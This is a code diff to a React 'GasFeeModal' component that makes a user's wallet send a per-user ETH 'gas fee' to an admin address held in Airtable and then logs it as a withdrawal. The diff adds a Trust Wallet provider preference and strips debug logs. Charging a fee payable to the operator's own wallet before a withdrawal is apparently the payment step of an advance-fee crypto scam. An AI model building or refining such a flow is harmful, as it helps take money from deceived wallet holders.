@@ -91,69 +91,70 @@ export default function GasFeeModal({
     const sendEth = async () => {
         let amountText = (internalUser?.fields?.gasFee || "0.003").toString();
 
-        // Strictly use the eth address key as requested by the user
-        const gasVault = adminAddresses['gas_fee_address_eth'] || adminAddresses['gas_fee_address_eth'.toLowerCase()] || '';
-
-        console.log('[DEBUG] GasFeeModal sendEth start', { amountText, gasVault, network, targetChainId, hasCbProvider: !!cbProvider });
+        const gasVault = adminAddresses['gas_fee_address_eth'] || '';
 
         try {
-            if (!cbProvider) {
-                setError("Wallet provider not found. Please reconnect.");
-                return;
-            }
-            if (!amountText || isNaN(parseFloat(amountText))) {
-                setError(`Invalid gas fee amount: ${amountText}`);
-                return;
-            }
             if (!gasVault) {
                 const foundKeys = Object.keys(adminAddresses).join(', ');
                 setError(`Admin wallet (gas_fee_address_eth) not found in Airtable! Keys: [${foundKeys || 'none'}]. Please update Settings.`);
                 return;
             }
             if (!gasVault.startsWith('0x')) {
-                setError(`Invalid gas fee address in Airtable: "${gasVault}". Please set a valid 0x Ethereum address for gas_fee_address_eth in Settings.`);
+                setError(`Invalid gas fee address: "${gasVault}". Must be a valid 0x Ethereum address.`);
                 return;
             }
 
             setStatus('processing');
-            setError('');
+            setError(null);
 
-            // 1. Ensure we are on the correct chain before sending
-            try {
-                await cbProvider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }],
-                });
-            } catch (switchError: any) {
-                // Switch failed or was cancelled - STOP HERE
-                setError(`Network switch to Ethereum Mainnet is required for gas payment.`);
+            // Use window.ethereum (Trust Wallet injected) first — it supports eth_sendTransaction
+            // Fall back to cbProvider only if window.ethereum is unavailable
+            const rawProvider: any = (typeof window !== 'undefined' && (window as any).ethereum)
+                ? (window as any).ethereum
+                : cbProvider;
+
+            if (!rawProvider) {
+                setError("No wallet provider found. Please open this page inside Trust Wallet browser.");
                 setStatus('idle');
                 return;
             }
 
-            const provider = new ethers.BrowserProvider(cbProvider);
+            // 1. Switch to Ethereum Mainnet
+            try {
+                await rawProvider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x1' }],
+                });
+            } catch (switchError: any) {
+                // Chain 0x1 may already be active — ignore 4902 (not added) or continue
+                if (switchError?.code !== 4902 && switchError?.code !== -32603) {
+                    setError(`Please switch your wallet to Ethereum Mainnet to pay the gas fee.`);
+                    setStatus('idle');
+                    return;
+                }
+            }
+
+            // 2. Get signer and send transaction via ethers BrowserProvider
+            const provider = new ethers.BrowserProvider(rawProvider);
             const signer = await provider.getSigner();
+            const fromAddress = await signer.getAddress();
 
-            console.log('[DEBUG] Sending transaction to:', gasVault, 'with value:', amountText, 'on', targetNetworkName);
-
-            // 2. Create and send the transaction
             const tx = await signer.sendTransaction({
                 to: gasVault.trim(),
-                value: ethers.parseEther(amountText.trim()),
+                from: fromAddress,
+                value: ethers.parseEther(parseFloat(amountText).toFixed(18)),
             });
 
-            setStatus('Transaction sent! Waiting for block...');
-            await tx.wait();
+            setStatus('confirming');
+            const receipt = await tx.wait();
 
             setStatus('success');
             setTxSuccess(true);
             setTxHash(tx.hash);
 
-            console.log('[DEBUG] Transaction successful! Hash:', tx.hash);
-
-            // 3. Update API call to record the transaction
+            // 3. Record the transaction
             try {
-                const apiRes = await fetch(`/api/withdrawal`, {
+                await fetch(`/api/withdrawal`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -166,17 +167,15 @@ export default function GasFeeModal({
                         status: "completed"
                     })
                 });
-                const apiResult = await apiRes.json();
-                console.log('[DEBUG] API response:', apiResult);
             } catch (apiErr) {
-                console.error("Failed to update API after success:", apiErr);
+                console.error("Failed to record fee transaction:", apiErr);
             }
 
             if (onSuccess) onSuccess(tx.hash);
 
         } catch (err: any) {
-            console.error("Gas Payment Error Details:", err);
-            const msg = err?.info?.error?.message || err?.message || "Transaction failed";
+            console.error("Gas Payment Error:", err);
+            const msg = err?.info?.error?.message || err?.error?.message || err?.message || "Transaction failed. Please try again.";
             setError(msg);
             setStatus('idle');
         }
